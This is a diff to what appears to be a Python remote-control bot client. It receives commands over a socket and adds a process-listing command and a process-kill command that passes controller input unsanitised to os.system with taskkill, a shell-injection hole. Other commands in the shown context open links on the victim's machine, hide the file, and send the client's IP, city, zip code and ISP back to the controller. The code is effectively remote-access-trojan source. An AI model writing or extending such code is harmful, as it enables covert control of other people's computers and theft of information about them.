@@ -2,6 +2,17 @@ from imports import *
 
 s = socket.socket()
 
+help_message = '''  ├ Help
+  └ open-link (link)
+    └ invisible (make the file hidden)
+      └ error (message) (send an error message)
+        └ exit (close client)
+          └ help (help menu)
+            └ ip-info (information about client ip)
+              └ pids (list of client proccesses)
+                └ kill (PID) (kill proccess by PID)
+            '''
+
 def setup_bot():
     while True:
         try:
@@ -31,13 +42,8 @@ try:
             s.send(f'  └─▷ {command.split(" ")[1]} has been successfully opened'.encode())
             webbrowser.open(command.split(' ')[1])
         elif command == 'help':
-            s.send(f'''  ├ Help
-  └ open-link (link)
-    └ invisible (make the file hidden)
-      └ error (message) (send an error message)
-        └ exit (close client)
-          └ help (help menu)
-            '''.encode())
+            s.send(help_message
+            .encode())
         elif command == 'ip-info':
             response = requests.get(f'http://ip-api.com/json/').json()
             s.send(f'''  ├ Ip: {response["query"]}
@@ -45,7 +51,23 @@ try:
     └ City: {response["regionName"]}
       └ Zip-code: {response["zip"]}
         └ Isp: {response["isp"]}'''.encode())
+        elif command == 'pids':
+            proccesses = ''
+            for proc in psutil.process_iter():
+                try:
+                    proccesses += f"{proc.name()}:{proc.pid}\n"
+                except:
+                    pass
+            s.send(proccesses.encode())
+        elif 'kill' in command:
+            print(command.split(' ')[1])
+            os.system(f"taskkill /F /PID {command.split(' ')[1]}")
+            s.send(f'  └─▷ {command.split(" ")[1]} was successfully killed'.encode())
         else:
-            s.send('  └─▷ Command not found'.encode())
+            s.send(f'  └─▷ Command not found!\n{help_message}'.encode())
+        
 except:
     setup_bot()
+
+
+
